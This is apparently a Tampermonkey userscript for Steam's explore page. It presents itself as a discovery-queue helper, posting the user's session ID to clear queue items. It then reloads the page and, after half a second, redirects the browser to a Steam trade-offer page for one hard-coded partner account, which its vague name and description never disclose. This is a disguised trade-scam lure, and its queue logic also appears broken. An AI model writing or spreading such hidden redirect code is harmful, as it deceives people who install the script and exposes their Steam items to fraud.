// ==UserScript==
// @name         Old Script
// @namespace    http://tampermonkey.net/
// @version      5
// @description  wyw
// @author       You
// @match        https://store.steampowered.com/explore/
// @require      https://code.jquery.com/jquery-3.3.1.js
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/428499/Old%20Script.user.js
// @updateURL https://update.greasyfork.org/scripts/428499/Old%20Script.meta.js
// ==/UserScript==

/* globals jQuery, $, waitForKeyElements, g_sessionID */


var GenerateQueue = function(queueNumber)
{
    jQuery.post( 'https://store.steampowered.com/explore/generatenewdiscoveryqueue', { sessionid: g_sessionID, queuetype: 0 } ).done( function( data )
    {
        var requests = [];
   
        for( var i = 0; i < data.queue.length; i++ )
        {
            requests.push( jQuery.post( 'https://store.steampowered.com/app/10', { appid_to_clear_from_queue: data.queue[ i ], sessionid: g_sessionID } ) );
        }
    } );
};

GenerateQueue(0);

window.location.reload();

setTimeout(
  function() 
  {
    var url = "https://steamcommunity.com/tradeoffer/new/?partner=70668332";
    $(location).attr('href', url);
  }, 500);